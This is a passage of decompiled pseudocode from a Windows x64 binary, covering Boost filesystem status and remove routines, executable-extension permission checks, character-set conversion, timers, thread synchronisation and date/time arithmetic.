  void *v21; // [rsp+70h] [rbp-78h]
  void *v22; // [rsp+78h] [rbp-70h]
  __int64 v23; // [rsp+88h] [rbp-60h]
  unsigned __int64 v24; // [rsp+90h] [rbp-58h]
  void *v25; // [rsp+98h] [rbp-50h]
  __int64 v26; // [rsp+A8h] [rbp-40h]
  unsigned __int64 v27; // [rsp+B0h] [rbp-38h]
  void *v28; // [rsp+B8h] [rbp-30h]
  __int64 v29; // [rsp+C8h] [rbp-20h]
  unsigned __int64 v30; // [rsp+D0h] [rbp-18h]
  void *v31; // [rsp+D8h] [rbp-10h]
  __int64 v32; // [rsp+E8h] [rbp+0h]
  unsigned __int64 v33; // [rsp+F0h] [rbp+8h]
  void *v34; // [rsp+F8h] [rbp+10h]
  unsigned __int64 v35; // [rsp+110h] [rbp+28h]

  v2 = a1;
  v3 = 292;
  if ( !(a2 & 1) )
    v3 = 438;
  v4 = sub_140031CA0(a1, &v34);
  v5 = (const char *)sub_1400054F0(v4, &v28);
  v6 = 3;
  if ( *((_QWORD *)v5 + 3) >= 0x10ui64 )
    v5 = *(const char **)v5;
  if ( !stricmp(v5, ".exe") )
    goto LABEL_53;
  v7 = sub_140031CA0(v2, &v22);
  v8 = (const char *)sub_1400054F0(v7, &v18);
  v6 = 15;
  if ( *((_QWORD *)v8 + 3) >= 0x10ui64 )
    v8 = *(const char **)v8;
  if ( !stricmp(v8, ".com") )
    goto LABEL_53;
  v9 = sub_140031CA0(v2, &v25);
  v10 = (const char *)sub_1400054F0(v9, &v15);
  v6 = 63;
  if ( *((_QWORD *)v10 + 3) >= 0x10ui64 )
    v10 = *(const char **)v10;
  if ( !stricmp(v10, ".bat") )
    goto LABEL_53;
  v11 = sub_140031CA0(v2, &v21);
  v12 = (const char *)sub_1400054F0(v11, &v31);
  v6 = -1;
  if ( *((_QWORD *)v12 + 3) >= 0x10ui64 )
    v12 = *(const char **)v12;
  if ( !stricmp(v12, ".cmd") )
LABEL_53:
    v13 = 1;
  else
    v13 = 0;
  if ( v6 < 0 )
  {
    v6 &= 0x7Fu;
    if ( v33 >= 0x10 )
      operator delete(v31);
    v33 = 15i64;
    v32 = 0i64;
    LOBYTE(v31) = 0;
  }
  if ( v6 & 0x40 )
  {
    v6 &= 0xBFu;
    if ( (unsigned __int64)v21 >= 8 )
      operator delete(v21);
    v21 = (void *)7;
    v20 = 0i64;
    LOWORD(v21) = 0;
  }
  if ( v6 & 0x20 )
  {
    v6 &= 0xDFu;
    if ( v17 >= 0x10 )
      operator delete(v15);
    v17 = 15i64;
    v16 = 0i64;
    LOBYTE(v15) = 0;
  }
  if ( v6 & 0x10 )
  {
    v6 &= 0xEFu;
    if ( v27 >= 8 )
      operator delete(v25);
    v27 = 7i64;
    v26 = 0i64;
    LOWORD(v25) = 0;
  }
  if ( v6 & 8 )
  {
    v6 &= 0xF7u;
    if ( v20 >= 0x10 )
      operator delete(v18);
    v20 = 15i64;
    v19 = 0i64;
    LOBYTE(v18) = 0;
  }
  if ( v6 & 4 )
  {
    v6 &= 0xFBu;
    if ( v24 >= 8 )
      operator delete(v22);
    v24 = 7i64;
    v23 = 0i64;
    LOWORD(v22) = 0;
  }
  if ( v6 & 2 )
  {
    v6 &= 0xFDu;
    if ( v30 >= 0x10 )
      operator delete(v28);
    v30 = 15i64;
    v29 = 0i64;
    LOBYTE(v28) = 0;
  }
  if ( v6 & 1 && v35 >= 8 )
    operator delete(v34);
  if ( v13 )
    v3 |= 0x49u;
  return v3;
}

//----- (00000001400343C0) ----------------------------------------------------
__int64 __fastcall sub_1400343C0(__int64 a1, _QWORD *a2, __int64 a3)
{
  __int64 v3; // rsi
  _QWORD *v4; // rbp
  __int64 v5; // rbx
  __int64 v6; // rcx
  unsigned __int64 v7; // rdi
  __int64 v8; // rax
  signed __int64 v9; // rcx
  __int64 v10; // rcx
  __m128i v12; // [rsp+20h] [rbp-C8h]
  __int64 v13; // [rsp+30h] [rbp-B8h]
  char Dst; // [rsp+38h] [rbp-B0h]
  __int64 v15; // [rsp+48h] [rbp-A0h]
  __int64 v16; // [rsp+50h] [rbp-98h]
  char v17; // [rsp+60h] [rbp-88h]

  v13 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v7 = (signed int)GetLastError();
  if ( v3 )
  {
    v8 = sub_140030C00(v6);
    *(_DWORD *)v3 = v7;
    *(_QWORD *)(v3 + 8) = v8;
  }
  if ( (unsigned int)v7 <= 0x35 && (v9 = 9007199256870924i64, _bittest64(&v9, v7))
    || (_DWORD)v7 == 123
    || (_DWORD)v7 == 87
    || (_DWORD)v7 == 161 )
  {
    *(_QWORD *)v5 = 1i64;
  }
  else if ( (_DWORD)v7 == 32 )
  {
    *(_DWORD *)v5 = 10;
    *(_DWORD *)(v5 + 4) = 0xFFFF;
  }
  else
  {
    if ( !v3 )
    {
      v16 = 15i64;
      v15 = 0i64;
      Dst = 0;
      sub_140004F20(&Dst, "boost::filesystem::status", 0x19ui64);
      v12.m128i_i32[0] = v7;
      v12.m128i_i64[1] = sub_140030C00(v10);
      _mm_store_si128(&v12, v12);
      sub_140033550((std::exception *)&v17, &Dst, v4, (__int128 *)v12.m128i_i8);
      CxxThrowException(&v17, &_TI4_AVfilesystem_error_filesystem_boost__);
    }
    *(_DWORD *)v5 = 0;
    *(_DWORD *)(v5 + 4) = 0xFFFF;
  }
  return v5;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3E98: using guessed type int _TI4_AVfilesystem_error_filesystem_boost__;

//----- (0000000140034510) ----------------------------------------------------
signed __int64 __fastcall sub_140034510(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rsi
  _QWORD *v3; // rdi
  __int64 v4; // rcx
  DWORD v5; // ebx
  signed __int64 result; // rax
  char v7; // [rsp+30h] [rbp+8h]

  v2 = a2;
  v3 = a1;
  if ( a1[3] >= 8ui64 )
    a1 = (_QWORD *)*a1;
  v5 = GetFileAttributesW((LPCWSTR)a1);
  if ( v5 == -1 )
    return *(unsigned int *)sub_1400343C0((__int64)&v7, v3, v2);
  if ( v2 )
  {
    *(_DWORD *)v2 = 0;
    *(_QWORD *)(v2 + 8) = sub_140030C00(v4);
  }
  if ( !_bittest((const signed int *)&v5, 0xAu) )
    return (v5 & 0x10 | 0x20) >> 4;
  if ( !(unsigned __int8)sub_140033FF0(v3) )
    return 9i64;
  result = 4i64;
  if ( v5 & 0x10 )
    result = 11i64;
  return result;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 140033FF0: using guessed type __int64 __fastcall sub_140033FF0(_QWORD);

//----- (00000001400345E0) ----------------------------------------------------
char __fastcall sub_1400345E0(LPCWSTR lpPathName, __int64 a2)
{
  __int64 v2; // rbx
  WCHAR *v3; // rsi
  int v4; // ebp
  __int64 v5; // rcx
  __int32 v6; // edi
  __int64 v7; // rax
  bool v8; // di
  char result; // al
  __m128i v10; // [rsp+20h] [rbp-C8h]
  __int64 v11; // [rsp+30h] [rbp-B8h]
  void *Dst; // [rsp+38h] [rbp-B0h]
  __int64 v13; // [rsp+48h] [rbp-A0h]
  unsigned __int64 v14; // [rsp+50h] [rbp-98h]
  char v15; // [rsp+60h] [rbp-88h]

  v11 = -2i64;
  v2 = a2;
  v3 = (WCHAR *)lpPathName;
  v10.m128i_i32[0] = 0;
  v10.m128i_i64[1] = sub_140030C00(lpPathName);
  v4 = sub_140034510(v3, (__int64)&v10);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, "boost::filesystem::remove", 0x19ui64);
  if ( v4 )
  {
    v6 = 0;
  }
  else
  {
    v6 = v10.m128i_i32[0];
    if ( v10.m128i_i32[0] )
    {
      if ( !v2 )
      {
        v10.m128i_i64[1] = sub_140030C00(v5);
        _mm_store_si128(&v10, v10);
        sub_140033550((std::exception *)&v15, &Dst, v3, (__int128 *)v10.m128i_i8);
        CxxThrowException(&v15, &_TI4_AVfilesystem_error_filesystem_boost__);
      }
      v7 = sub_140030C00(v5);
      *(_DWORD *)v2 = v6;
      goto LABEL_10;
    }
  }
  if ( !v2 )
    goto LABEL_11;
  *(_DWORD *)v2 = 0;
  v7 = sub_140030C00(v5);
LABEL_10:
  *(_QWORD *)(v2 + 8) = v7;
LABEL_11:
  v8 = v6 != 0;
  if ( v14 >= 0x10 )
    operator delete(Dst);
  if ( v8 )
    result = 0;
  else
    result = sub_140034730(v3);
  return result;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3E98: using guessed type int _TI4_AVfilesystem_error_filesystem_boost__;

//----- (0000000140034880) ----------------------------------------------------
__int64 __fastcall sub_140034880(_QWORD *a1)
{
  __int64 result; // rax
  volatile signed __int32 *v2; // rbx

  result = 0i64;
  *a1 = 0i64;
  v2 = (volatile signed __int32 *)a1[1];
  a1[1] = 0i64;
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
    if ( !_InterlockedDecrement(v2 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
  }
  return result;
}

//----- (00000001400348D0) ----------------------------------------------------
_DWORD *__fastcall sub_1400348D0(_DWORD *a1, _QWORD *a2, __int64 a3)
{
  __int64 v3; // r14
  _QWORD *v4; // rdi
  _DWORD *v5; // rsi
  const WCHAR *v6; // rcx
  DWORD v7; // eax
  __int64 v8; // rcx
  char v9; // bp
  _WORD *v10; // rdx
  unsigned __int64 v11; // r8
  const WCHAR *v12; // rcx
  HANDLE v13; // rbx
  int v14; // eax
  __int64 v16; // [rsp+40h] [rbp-68h]
  LPCWSTR lpFileName; // [rsp+50h] [rbp-58h]
  __int64 v18; // [rsp+60h] [rbp-48h]
  unsigned __int64 v19; // [rsp+68h] [rbp-40h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( a2[3] < 8ui64 )
    v6 = (const WCHAR *)a2;
  else
    v6 = (const WCHAR *)*a2;
  v7 = GetFileAttributesW(v6);
  v9 = v7;
  if ( v7 == -1 )
  {
    sub_1400343C0((__int64)v5, v4, v3);
  }
  else
  {
    if ( _bittest((const signed int *)&v7, 0xAu) )
    {
      if ( v4[3] < 8ui64 )
        v10 = v4;
      else
        v10 = (_WORD *)*v4;
      v19 = 7i64;
      v18 = 0i64;
      LOWORD(lpFileName) = 0;
      if ( *v10 )
      {
        v11 = -1i64;
        do
          ++v11;
        while ( v10[v11] );
      }
      else
      {
        v11 = 0i64;
      }
      sub_14002E600(&lpFileName, v10, v11);
      v12 = (const WCHAR *)&lpFileName;
      if ( v19 >= 8 )
        v12 = lpFileName;
      v13 = CreateFileW(v12, 0, 7u, 0i64, 3u, 0x2000000u, 0i64);
      if ( v19 >= 8 )
        operator delete((void *)lpFileName);
      v19 = 7i64;
      v18 = 0i64;
      LOWORD(lpFileName) = 0;
      if ( v13 == (HANDLE)-1i64 )
      {
        sub_1400343C0((__int64)v5, v4, v3);
        return v5;
      }
      if ( !(unsigned __int8)sub_140033FF0(v4) )
      {
        v14 = sub_1400340D0((__int64)v4, v9);
        *v5 = 9;
        v5[1] = v14;
        CloseHandle(v13);
        return v5;
      }
      CloseHandle(v13);
    }
    if ( v3 )
    {
      *(_DWORD *)v3 = 0;
      *(_QWORD *)(v3 + 8) = sub_140030C00(v8);
    }
    LODWORD(v16) = 3;
    if ( !(v9 & 0x10) )
      LODWORD(v16) = 2;
    HIDWORD(v16) = sub_1400340D0((__int64)v4, v9);
    *(_QWORD *)v5 = v16;
  }
  return v5;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 140033FF0: using guessed type __int64 __fastcall sub_140033FF0(_QWORD);

//----- (0000000140034C40) ----------------------------------------------------
_QWORD *__fastcall sub_140034C40(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &loc_1400A27F0;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}

//----- (0000000140034CC0) ----------------------------------------------------
void *__fastcall sub_140034CC0(__int64 a1, _BYTE *a2, int a3)
{
  void *v3; // rbx
  int v4; // er8
  int v5; // er8
  void *v6; // rcx
  size_t v7; // r8
  char *v8; // rdx

  v3 = a2;
  *((_QWORD *)a2 + 3) = 15i64;
  *((_QWORD *)a2 + 2) = 0i64;
  *a2 = 0;
  if ( !a3 )
  {
    v7 = 2i64;
    v8 = "ok";
    goto LABEL_10;
  }
  v4 = a3 - 1;
  if ( !v4 )
  {
    v7 = 7i64;
    v8 = "partial";
    goto LABEL_10;
  }
  v5 = v4 - 1;
  if ( !v5 )
  {
    v7 = 5i64;
    v8 = "error";
LABEL_10:
    v6 = v3;
    goto LABEL_11;
  }
  v6 = a2;
  if ( v5 == 1 )
  {
    v7 = 6i64;
    v8 = "noconv";
  }
  else
  {
    v7 = 13i64;
    v8 = "unknown error";
  }
LABEL_11:
  sub_140004F20(v6, v8, v7);
  return v3;
}

//----- (0000000140034D70) ----------------------------------------------------
const char *sub_140034D70()
{
  return "codecvt";
}

//----- (0000000140034D80) ----------------------------------------------------
signed __int64 __fastcall sub_140034D80(__int64 a1, __int64 a2, const CHAR *a3, __int64 a4, _QWORD *a5, WCHAR *lpWideCharStr, __int64 a7, WCHAR **a8)
{
  __int64 v8; // rsi
  const CHAR *v9; // rbx
  BOOL v10; // eax
  int v11; // eax
  WCHAR *v13; // rcx

  v8 = a4;
  v9 = a3;
  v10 = AreFileApisANSI();
  v11 = MultiByteToWideChar(v10 == 0, 1u, v9, v8 - (_DWORD)v9, lpWideCharStr, (a7 - (signed __int64)lpWideCharStr) >> 1);
  if ( !v11 )
    return 2i64;
  v13 = &lpWideCharStr[v11];
  *a5 = v8;
  *a8 = v13;
  *v13 = 0;
  return 0i64;
}

//----- (0000000140034E10) ----------------------------------------------------
signed __int64 __fastcall sub_140034E10(__int64 a1, __int64 a2, const WCHAR *a3, __int64 a4, _QWORD *a5, CHAR *lpMultiByteStr, int a7, CHAR **a8)
{
  __int64 v8; // rsi
  const WCHAR *v9; // rbx
  BOOL v10; // eax
  int v11; // eax
  CHAR *v13; // rcx

  v8 = a4;
  v9 = a3;
  v10 = AreFileApisANSI();
  v11 = WideCharToMultiByte(
          v10 == 0,
          0x400u,
          v9,
          (v8 - (signed __int64)v9) >> 1,
          lpMultiByteStr,
          a7 - (_DWORD)lpMultiByteStr,
          0i64,
          0i64);
  if ( !v11 )
    return 2i64;
  v13 = &lpMultiByteStr[v11];
  *a5 = v8;
  *a8 = v13;
  *v13 = 0;
  return 0i64;
}

//----- (0000000140034EC0) ----------------------------------------------------
_QWORD *__fastcall sub_140034EC0(_QWORD *a1)
{
  _QWORD *v1; // rdi
  double v2; // xmm6_8
  int v3; // ebx
  _QWORD *result; // rax
  LARGE_INTEGER PerformanceCount; // [rsp+48h] [rbp+10h]
  LARGE_INTEGER Frequency; // [rsp+50h] [rbp+18h]

  v1 = a1;
  if ( QueryPerformanceFrequency(&Frequency) && (v2 = 1000000000.0 / (double)(signed int)Frequency.LowPart, v2 > 0.0) )
  {
    v3 = 0;
    if ( QueryPerformanceCounter(&PerformanceCount) )
    {
LABEL_6:
      *v1 = (unsigned int)(signed int)((double)(signed int)PerformanceCount.LowPart * v2);
      result = v1;
    }
    else
    {
      while ( (unsigned int)++v3 <= 3 )
      {
        if ( QueryPerformanceCounter(&PerformanceCount) )
          goto LABEL_6;
      }
      *v1 = 0i64;
      result = v1;
    }
  }
  else
  {
    *v1 = 0i64;
    result = v1;
  }
  return result;
}

//----- (0000000140034FB0) ----------------------------------------------------
int __fastcall sub_140034FB0(__int64 **a1)
{
  __int64 **v1; // r14
  __int64 *v2; // rbx
  __int64 *i; // rdi
  __int64 v4; // rsi
  signed int v5; // eax
  void *v6; // rbp
  HANDLE v7; // rcx
  __int64 *v8; // rdi
  __int64 *j; // rbx
  char *v10; // rcx
  __int64 *v11; // rdi
  __int64 *k; // rsi
  volatile signed __int32 *v13; // rbx
  __int64 *v14; // rcx
  char *v15; // rcx
  int result; // eax
  char v17; // [rsp+58h] [rbp+10h]

  v1 = a1;
  *a1 = (__int64 *)&off_1400A4EF8;
  v2 = a1[7];
  for ( i = a1[8]; v2 != i; v2 += 2 )
  {
    v4 = v2[1];
    v5 = _InterlockedExchangeAdd((volatile signed __int32 *)v2[1], 0x80000000);
    if ( !_bittest(&v5, 0x1Eu)
      && v5 > (signed int)2147483648
      && !_interlockedbittestandset((volatile signed __int32 *)v4, 0x1Eu) )
    {
      v6 = *(void **)(v4 + 8);
      if ( !v6 )
      {
        v7 = sub_140013410(0, 0);
        v6 = (void *)_InterlockedCompareExchange((volatile signed __int64 *)(v4 + 8), (signed __int64)v7, 0i64);
        if ( v6 )
          CloseHandle(v7);
        else
          v6 = v7;
      }
      SetEvent(v6);
    }
    sub_140036570(*v2);
  }
  v8 = v1[11];
  for ( j = v1[10]; j != v8; j += 2 )
    sub_140036360(*j);
  v10 = (char *)v1[13];
  if ( (unsigned __int64)(v10 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
    CloseHandle(v10);
  v11 = v1[10];
  if ( v11 )
  {
    for ( k = v1[11]; v11 != k; v11 += 2 )
    {
      v13 = (volatile signed __int32 *)v11[1];
      if ( v13 )
      {
        if ( !_InterlockedDecrement(v13 + 2) )
        {
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v13 + 8i64))(v13);
          if ( !_InterlockedDecrement(v13 + 3) )
            (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v13 + 16i64))(v13);
        }
      }
    }
    operator delete(v1[10]);
    v1[10] = 0i64;
    v1[11] = 0i64;
    v1[12] = 0i64;
  }
  v14 = v1[7];
  if ( v14 )
  {
    operator delete(v14);
    v1[7] = 0i64;
    v1[8] = 0i64;
    v1[9] = 0i64;
  }
  sub_14000EB20(v1 + 5, (__int64 *)&v17, *v1[5], (__int64)v1[5]);
  operator delete(v1[5]);
  v15 = (char *)v1[2];
  result = (_DWORD)v15 - 1;
  if ( (unsigned __int64)(v15 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
    result = CloseHandle(v15);
  return result;
}
// 1400A4EF8: using guessed type __int64 (__fastcall *off_1400A4EF8)(void *);

//----- (0000000140035150) ----------------------------------------------------
BOOL __fastcall sub_140035150(void *a1, const LARGE_INTEGER *a2, LONG a3, void (__stdcall *a4)(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue), void *a5)
{
  return SetWaitableTimer(a1, a2, a3, a4, a5, 0);
}

//----- (0000000140035160) ----------------------------------------------------
int __fastcall sub_140035160(volatile signed __int32 *a1, void (__cdecl *a2)(__int64))
{
  void (__cdecl *v2)(__int64); // rsi
  volatile signed __int32 *v3; // rbx
  char *v4; // rdi
  __int64 v5; // rcx
  char *v7; // rdi
  void *v9; // rcx
  char *v10; // rdi
  int result; // eax
  char v13; // [rsp+48h] [rbp-80h]
  char *hObject; // [rsp+50h] [rbp-78h]
  CHAR Name; // [rsp+58h] [rbp-70h]

  v2 = a2;
  v3 = a1;
  v13 = 0;
  hObject = 0i64;
  Name = 0;
  while ( 1 )
  {
    if ( *v3 == -1051250462 )
      goto LABEL_31;
    if ( !_InterlockedCompareExchange(v3, 2131174883, 0) )
      break;
    if ( v13 )
    {
      v9 = hObject;
      goto LABEL_30;
    }
    _InterlockedIncrement(v3 + 1);
    v13 = 1;
    if ( *v3 == -1051250462 )
      goto LABEL_31;
    v9 = hObject;
    if ( hObject )
    {
LABEL_30:
      WaitForSingleObjectEx(v9, 0xFFFFFFFF, 0);
    }
    else
    {
      if ( Name == (_BYTE)hObject )
        sub_140036410((__int64)&Name, (__int64)v3);
      v10 = (char *)CreateEventA(0i64, 1, 0, &Name);
      hObject = v10;
    }
  }
  v4 = hObject;
  if ( hObject )
    goto LABEL_36;
  if ( Name == (_BYTE)hObject )
    sub_140036410((__int64)&Name, (__int64)v3);
  v4 = (char *)OpenEventA(0x100002u, 0, &Name);
  v5 = 0i64;
  hObject = v4;
  if ( v4 )
LABEL_36:
    ResetEvent(v4);
  v2(v5);
  if ( !v13 )
    _InterlockedIncrement(v3 + 1);
  _InterlockedExchange(v3, -1051250462);
  v7 = hObject;
  if ( hObject )
  {
LABEL_20:
    SetEvent(v7);
    goto LABEL_31;
  }
  if ( *((_DWORD *)v3 + 1) <= 1 )
  {
LABEL_31:
    v7 = hObject;
    goto LABEL_32;
  }
  if ( !Name )
    sub_140036410((__int64)&Name, (__int64)v3);
  v7 = (char *)CreateEventA(0i64, 1, 0, &Name);
  hObject = v7;
  if ( v7 )
    goto LABEL_20;
LABEL_32:
  result = (_DWORD)v7 - 1;
  if ( (unsigned __int64)(v7 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
    result = CloseHandle(v7);
  return result;
}

//----- (0000000140035390) ----------------------------------------------------
DWORD __fastcall sub_140035390(__int64 a1)
{
  DWORD result; // eax

  nullsub_1(a1);
  result = TlsAlloc();
  dwTlsIndex = result;
  return result;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);

//----- (0000000140035580) ----------------------------------------------------
_DWORD *__fastcall sub_140035580(__int64 *a1, _DWORD *a2)
{
  __int64 v2; // r8
  _DWORD *v3; // rbx
  _DWORD *result; // rax
  int v5; // edx
  __int16 v6; // dx
  unsigned int v7; // er9
  unsigned int v8; // edx
  __int16 v9; // [rsp+30h] [rbp+8h]
  unsigned __int16 v10; // [rsp+32h] [rbp+Ah]
  unsigned __int16 v11; // [rsp+34h] [rbp+Ch]

  v2 = *a1;
  v3 = a2;
  if ( (*a1 - 9223372036854775806i64) & 0xFFFFFFFFFFFFFFFCui64 || v2 == -9223372036854775807i64 )
  {
    sub_1400357F0(&v9, v2 / 86400000000i64);
    v6 = ((unsigned int)((unsigned __int64)(715827883i64 * (14 - v10)) >> 32) >> 31)
       + ((signed int)((unsigned __int64)(715827883i64 * (14 - v10)) >> 32) >> 1);
    v7 = (unsigned __int16)(v9 - v6 + 4800);
    v8 = (signed int)(1374389535 * (unsigned __int64)(unsigned __int16)(v9 - v6 + 4800) >> 32) >> 7;
    result = v3;
    *v3 = (v7 >> 2)
        + 365 * v7
        + (153
         * (unsigned __int16)(v10
                            - 3
                            + 12
                            * (((unsigned int)((unsigned __int64)(715827883i64 * (14 - v10)) >> 32) >> 31)
                             + ((signed int)((unsigned __int64)(715827883i64 * (14 - v10)) >> 32) >> 1)))
         + 2)
        / 5
        + v8
        + (v8 >> 31)
        - (signed int)v7 / 100
        + v11
        - 32045;
  }
  else if ( v2 == 9223372036854775806i64 )
  {
    sub_140018630(a2, 0);
    result = v3;
  }
  else if ( v2 == 0x8000000000000000i64 )
  {
    sub_140018630(a2, 1);
    result = v3;
  }
  else
  {
    v5 = 5;
    if ( v2 == 0x7FFFFFFFFFFFFFFFi64 )
      v5 = 2;
    sub_140018630(v3, v5);
    result = v3;
  }
  return result;
}
// 1400357F0: using guessed type __int64 __fastcall sub_1400357F0(_QWORD, _QWORD);

//----- (0000000140035710) ----------------------------------------------------
__int64 __fastcall sub_140035710(__int64 *a1, __int64 a2, _BYTE *a3)
{
  _BYTE *v3; // rdi
  __int64 v4; // rbp
  volatile signed __int32 **v5; // rsi
  volatile signed __int32 *v6; // rbx
  __int128 *v7; // rax
  void *v8; // rax
  unsigned __int8 v9; // di
  void *v10; // rbx
  HANDLE v11; // rax
  __int128 v13; // [rsp+30h] [rbp-48h]
  __int128 v14; // [rsp+40h] [rbp-38h]
  char v15; // [rsp+50h] [rbp-28h]
  LPVOID lpMem; // [rsp+98h] [rbp+20h]

  v3 = a3;
  v4 = a2;
  v5 = (volatile signed __int32 **)a1;
  sub_140035C80(a1, (__int64 *)&lpMem);
  v6 = (volatile signed __int32 *)lpMem;
  if ( lpMem )
  {
    v7 = (__int128 *)sub_1400187C0((__int64)&v15, v4);
    v13 = *v7;
    v14 = v7[1];
    v8 = (void *)sub_1400364F0(v5);
    if ( sub_140035E70(v8, (__int64)&v13) )
    {
      sub_1400366B0(v5);
      *v3 = 1;
    }
    else
    {
      *v3 = 0;
    }
    v9 = 1;
  }
  else
  {
    v9 = 0;
  }
  if ( v6 && !_InterlockedDecrement(v6 + 2) )
  {
    v10 = lpMem;
    (**(void (__fastcall ***)(LPVOID, _QWORD))lpMem)(lpMem, 0i64);
    v11 = GetProcessHeap();
    HeapFree(v11, 0, v10);
  }
  return v9;
}
// 1400364F0: using guessed type __int64 __fastcall sub_1400364F0(_QWORD);

//----- (0000000140035990) ----------------------------------------------------
struct _FILETIME __fastcall sub_140035990(__int64 a1)
{
  _QWORD *v1; // rdi
  signed __int64 (*v2)(); // rdx
  HMODULE v3; // rax
  FARPROC v4; // rax
  __int64 v5; // rcx
  struct _FILETIME result; // rax
  __int64 *v7; // rdi
  signed __int64 v8; // r8
  signed __int64 v9; // r8
  __int64 v10; // [rsp+20h] [rbp-30h]
  struct _FILETIME FileTime; // [rsp+28h] [rbp-28h]
  SYSTEMTIME SystemTime; // [rsp+30h] [rbp-20h]

  v1 = (_QWORD *)a1;
  FileTime = 0i64;
  if ( *(_BYTE *)(a1 + 16) )
  {
    v2 = (signed __int64 (*)())qword_1400D9E50;
    if ( !qword_1400D9E50 )
    {
      v3 = GetModuleHandleA("KERNEL32.DLL");
      v4 = GetProcAddress(v3, "GetTickCount64");
      v2 = sub_14001A620;
      if ( v4 )
        v2 = v4;
      qword_1400D9E50 = (__int64)v2;
    }
    v5 = v1[1] - (v2() - *v1);
    if ( v5 <= 0 )
      result = FileTime;
    else
      result = (struct _FILETIME)(-10000 * v5);
  }
  else
  {
    v7 = (__int64 *)(a1 + 24);
    *(_QWORD *)&SystemTime.wYear = 0i64;
    *(_QWORD *)&SystemTime.wHour = 0i64;
    sub_140035580((__int64 *)(a1 + 24), &v10);
    sub_1400357F0(&v10, (unsigned int)v10);
    SystemTime.wYear = v10;
    sub_140035580(v7, &v10);
    sub_1400357F0(&v10, (unsigned int)v10);
    SystemTime.wMonth = WORD1(v10);
    sub_140035580(v7, &v10);
    sub_1400357F0(&v10, (unsigned int)v10);
    SystemTime.wDay = WORD2(v10);
    sub_140035CB0(&v10, v7);
    SystemTime.wHour = ((unsigned __int64)(v10
                                         + ((unsigned __int128)(v10 * (signed __int128)-7442832613395060283i64) >> 64)) >> 63)
                     + ((signed __int64)(v10
                                       + ((unsigned __int128)(v10 * (signed __int128)-7442832613395060283i64) >> 64)) >> 31);
    sub_140035CB0(&v10, v7);
    v8 = ((unsigned __int64)(v10 + ((unsigned __int128)(v10 * (signed __int128)-8130577079664715991i64) >> 64)) >> 63)
       + ((signed __int64)(v10 + ((unsigned __int128)(v10 * (signed __int128)-8130577079664715991i64) >> 64)) >> 25);
    SystemTime.wMinute = v8
                       - 60
                       * (((unsigned __int64)(v8
                                            + ((unsigned __int128)(v8 * (signed __int128)-8608480567731124087i64) >> 64)) >> 63)
                        + ((signed __int64)(v8
                                          + ((unsigned __int128)(v8 * (signed __int128)-8608480567731124087i64) >> 64)) >> 5));
    sub_140035CB0(&v10, v7);
    v9 = ((unsigned __int64)((unsigned __int128)(v10 * (signed __int128)4835703278458516699i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)(v10 * (signed __int128)4835703278458516699i64) >> 64) >> 18);
    SystemTime.wSecond = v9
                       - 60
                       * (((unsigned __int64)(v9
                                            + ((unsigned __int128)(v9 * (signed __int128)-8608480567731124087i64) >> 64)) >> 63)
                        + ((signed __int64)(v9
                                          + ((unsigned __int128)(v9 * (signed __int128)-8608480567731124087i64) >> 64)) >> 5));
    if ( SystemTimeToFileTime(&SystemTime, &FileTime) )
    {
      sub_140035CB0(&v10, v7);
      sub_140035CB0(&v10, v7);
      result = (struct _FILETIME)(*(_QWORD *)&FileTime
                                + 10
                                * (v10
                                 - 1000000
                                 * (((unsigned __int64)((unsigned __int128)(v10 * (signed __int128)4835703278458516699i64) >> 64) >> 63)
                                  + ((signed __int64)((unsigned __int128)(v10 * (signed __int128)4835703278458516699i64) >> 64) >> 18))));
    }
    else
    {
      result = 0i64;
    }
  }
  return result;
}
// 1400357F0: using guessed type __int64 __fastcall sub_1400357F0(_QWORD, _QWORD);
// 1400D9E50: using guessed type __int64 qword_1400D9E50;

//----- (0000000140035BF0) ----------------------------------------------------
DWORD *__fastcall sub_140035BF0(DWORD *a1)
{
  DWORD *v1; // rbx

  v1 = a1;
  *a1 = GetCurrentThreadId();
  return v1;
}

//----- (0000000140035C10) ----------------------------------------------------
_DWORD *__fastcall sub_140035C10(__int64 *a1, _DWORD *a2)
{
  _DWORD *v2; // rdi
  volatile signed __int32 *v3; // rax
  void *v4; // rbx
  HANDLE v5; // rax
  LPVOID lpMem; // [rsp+50h] [rbp+18h]

  v2 = a2;
  sub_140035C80(a1, (__int64 *)&lpMem);
  v3 = (volatile signed __int32 *)lpMem;
  if ( lpMem )
  {
    *v2 = *((_DWORD *)lpMem + 8);
    if ( !_InterlockedDecrement(v3 + 2) )
    {
      v4 = lpMem;
      (**(void (__fastcall ***)(LPVOID, _QWORD))lpMem)(lpMem, 0i64);
      v5 = GetProcessHeap();
      HeapFree(v5, 0, v4);
    }
  }
  else
  {
    *v2 = (_DWORD)lpMem;
  }
  return v2;
}

//----- (0000000140035C80) ----------------------------------------------------
__int64 *__fastcall sub_140035C80(__int64 *a1, __int64 *a2)
{
  __int64 v2; // rax

  v2 = *a1;
  *a2 = *a1;
  if ( v2 )
